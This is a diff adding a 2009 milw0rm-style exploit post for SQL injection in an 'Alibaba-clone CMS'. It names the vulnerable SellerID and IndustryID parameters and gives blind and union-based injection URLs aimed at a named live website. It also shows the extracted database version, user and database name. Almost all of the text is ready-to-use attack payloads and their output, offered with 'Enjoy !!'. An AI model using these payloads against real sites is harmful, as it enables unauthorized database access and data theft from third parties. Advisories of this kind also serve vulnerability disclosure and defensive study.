@@ -1,0 +1,50 @@
+# [+] Alibaba-clone CMS (SQL/bSQL) Remote SQL  Injection
+
+# [+] Author : 599eme Man
+# [+] Contact : Flouf@live.fr
+# [+] Dowload : http://blog.duslerim.net/cms/alibabacom-clone-new.html
+# [+] Big Thanks to: Moudi :)
+
+>> [+] Exploit :
+
+http://www.site.com/path/supplier/view_contact_details.php?SellerID=(Blind) or (SQL)
+
+http://www.site.com/path/category.php?IndustryID=(Blind) or (SQL)
+
+>> [+] Demo BLIND:
+
+
+http://www.webdevelopmenthouse.com/alibaba-clone/category.php?IndustryID=25 and 1=1 <= true
+http://www.webdevelopmenthouse.com/alibaba-clone/category.php?IndustryID=25 and 1=2 <= false
+
+http://www.webdevelopmenthouse.com/alibaba-clone/category.php?IndustryID=25 and 1=1+AND+SUBSTRING(@@version,1,1)=5 <= true
+http://www.webdevelopmenthouse.com/alibaba-clone/category.php?IndustryID=25 and 1=1+AND+SUBSTRING(@@version,1,1)=4 <= false
+The MYSQL version is : 5
+
+http://www.webdevelopmenthouse.com/alibaba-clone/category.php?IndustryID=25+and+1=1+union+select+1,2,version()--
+See now: 5.0.45-community-nt
+
+http://www.webdevelopmenthouse.com/alibaba-clone/category.php?IndustryID=25+and+1=1+union+select+1,2,user()--
+Nadir_db@temp-webs
+
+http://www.webdevelopmenthouse.com/alibaba-clone/category.php?IndustryID=25+and+1=1+union+select+1,2,database()--
+nas04
+
+
+
+>> [+] Demo SQL:
+
+
+http://www.webdevelopmenthouse.com/alibaba-clone/category.php?IndustryID=18+union+select+1,2,version()--
+The MYSQL version is : 5
+
+http://www.webdevelopmenthouse.com/alibaba-clone/category.php?IndustryID=18+union+select+1,2,user()--
+Nadir_db@temp-webs
+
+http://www.webdevelopmenthouse.com/alibaba-clone/category.php?IndustryID=18+union+select+1,2,database()--
+nas04
+
+
+Enjoy !!
+
+# milw0rm.com [2009-07-20]
